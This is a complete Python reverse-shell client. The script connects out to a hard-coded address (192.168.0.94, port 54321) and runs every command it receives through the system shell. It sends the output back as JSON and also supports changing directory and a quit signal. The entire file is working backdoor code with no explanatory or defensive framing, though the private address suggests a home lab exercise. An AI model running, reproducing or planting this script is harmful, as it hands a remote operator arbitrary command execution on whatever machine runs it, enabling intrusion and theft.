#!/usr/bin/python3
import socket
# from termcolor import colored
import subprocess
import json
from sys import exit
import os


HOST = '192.168.0.94'
PORT = 54321


def reliable_send(_s, _data):
	json_data = json.dumps(_data.decode('UTF-8'))
	_s.sendall(json_data.encode('UTF-8'))


def reliable_recv(_s):
	data = ""
	while True:
		try:
			data = data + (_s.recv(1024)).decode('UTF-8')
			print(data)
			return json.loads(data)
		except ValueError:
			continue


def shell(_s):
	while True:
		cmd = reliable_recv(_s)
		if cmd == 'q':
			print('[-] Instruction to close sent from the server')
			# print(colored('[-] Instruction to close sent from the server', 'red'))
			_s.close()
			exit(1)
			break
		elif cmd[:2] == 'cd' and len(cmd[3:]) > 1:
			try:
				os.chdir(cmd[3:])
			except:
				continue
		else:
			proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE,
									stderr=subprocess.PIPE, stdin=subprocess.PIPE)
			result = proc.stdout.read() + proc.stderr.read()
			reliable_send(_s, result)


def client():
	with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
		s.connect((HOST, PORT))
		with s:
			shell(s)


client()
